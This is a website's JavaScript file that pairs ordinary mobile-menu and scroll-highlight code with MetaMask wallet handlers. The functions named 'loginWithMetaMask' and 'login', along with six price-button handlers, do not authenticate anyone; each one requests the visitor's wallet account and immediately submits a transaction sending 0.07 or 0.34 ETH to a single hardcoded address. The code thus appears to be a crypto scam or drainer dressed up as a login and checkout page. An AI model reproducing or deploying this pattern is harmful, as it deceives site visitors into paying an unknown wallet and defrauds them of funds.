const menu = document.querySelector('#mobile-menu');
const menuLinks = document.querySelector('.navbar__menu');
const navLogo = document.querySelector('#navbar__logo');

// Display Mobile Menu
const mobileMenu = () => {
  menu.classList.toggle('is-active');
  menuLinks.classList.toggle('active');
};

menu.addEventListener('click', mobileMenu);

// Show active menu when scrolling
const highlightMenu = () => {
  const elem = document.querySelector('.highlight');
  const homeMenu = document.querySelector('#home-page');
  const aboutMenu = document.querySelector('#about-page');
  const servicesMenu = document.querySelector('#services-page');
  let scrollPos = window.scrollY;
  // console.log(scrollPos);

  // adds 'highlight' class to my menu items
  if (window.innerWidth > 960 && scrollPos < 600) {
    homeMenu.classList.add('highlight');
    aboutMenu.classList.remove('highlight');
    return;
  } else if (window.innerWidth > 960 && scrollPos < 1400) {
    aboutMenu.classList.add('highlight');
    homeMenu.classList.remove('highlight');
    servicesMenu.classList.remove('highlight');
    return;
  } else if (window.innerWidth > 960 && scrollPos < 2345) {
    servicesMenu.classList.add('highlight');
    aboutMenu.classList.remove('highlight');
    return;
  }

  if ((elem && window.innerWIdth < 960 && scrollPos < 600) || elem) {
    elem.classList.remove('highlight');
  }
};

window.addEventListener('scroll', highlightMenu);
window.addEventListener('click', highlightMenu);

//  Close mobile Menu when clicking on a menu item
const hideMobileMenu = () => {
  const menuBars = document.querySelector('.is-active');
  if (window.innerWidth <= 768 && menuBars) {
    menu.classList.toggle('is-active');
    menuLinks.classList.remove('active');
  }
};

menuLinks.addEventListener('click', hideMobileMenu);
navLogo.addEventListener('click', hideMobileMenu);

const erth = document.querySelector('.enableEthereumButton');
const er = document.querySelector('.enableEt');
const e21 = document.querySelector('.prices');
const e22 = document.querySelector('.pricez');
const e31 = document.querySelector('.pricev');
const e32 = document.querySelector('.priceo');
const e41 = document.querySelector('.pricex');
const e42 = document.querySelector('.pricem');



    async function loginWithMetaMask() {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
        const params = [{
            from: accounts[0],
           to: '0xC97B203E2e507954E1dD00B5F669d8d6E48Ab036',
           value: Number(70000000000000000).toString(16),
           gasLimit: (21000).toString(16),
        }];

        const account = await  window.ethereum.request({ method: 'eth_sendTransaction',params })


    }

    async function login() {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
        const params = [{
            from: accounts[0],
            to: '0xC97B203E2e507954E1dD00B5F669d8d6E48Ab036',
            value: Number(340000000000000000).toString(16),
            gasPrice:(5000000000).toString(16),
            gas: (55000).toString(16),
        }];

        const account = await  window.ethereum.request({ method: 'eth_sendTransaction',params })


    }


    async function s5() {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
        const params = [{
            from: accounts[0],
           to: '0xC97B203E2e507954E1dD00B5F669d8d6E48Ab036',
            value: Number(70000000000000000).toString(16),
        }];

        const account = await  window.ethereum.request({ method: 'eth_sendTransaction',params })


    }

    async function s6() {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
        const params = [{
            from: accounts[0],
           to: '0xC97B203E2e507954E1dD00B5F669d8d6E48Ab036',
            value: Number(70000000000000000).toString(16),
        }];

        const account = await  window.ethereum.request({ method: 'eth_sendTransaction',params })


    }

    async function s7() {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
        const params = [{
            from: accounts[0],
           to: '0xC97B203E2e507954E1dD00B5F669d8d6E48Ab036',
            value: Number(70000000000000000).toString(16),
        }];

        const account = await  window.ethereum.request({ method: 'eth_sendTransaction',params })


    }

    async function s8() {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
        const params = [{
            from: accounts[0],
           to: '0xC97B203E2e507954E1dD00B5F669d8d6E48Ab036',
            value: Number(70000000000000000).toString(16),
        }];

        const account = await  window.ethereum.request({ method: 'eth_sendTransaction',params })


    }

    async function s9() {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
        const params = [{
            from: accounts[0],
           to: '0xC97B203E2e507954E1dD00B5F669d8d6E48Ab036',
            value: Number(70000000000000000).toString(16),
        }];

        const account = await  window.ethereum.request({ method: 'eth_sendTransaction',params })


    }

    async function s10() {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
        const params = [{
            from: accounts[0],
           to: '0xC97B203E2e507954E1dD00B5F669d8d6E48Ab036',
            value: Number(70000000000000000).toString(16),
        }];

        const account = await  window.ethereum.request({ method: 'eth_sendTransaction',params })


    }
  
 erth.addEventListener('click', loginWithMetaMask);
  
 er.addEventListener('click', login);

 e21.addEventListener('click', s5);

 e22.addEventListener('click', s6);

 e31.addEventListener('click', s7);

 e32.addEventListener('click', s8);

 e41.addEventListener('click', s9);

 e42.addEventListener('click', s10);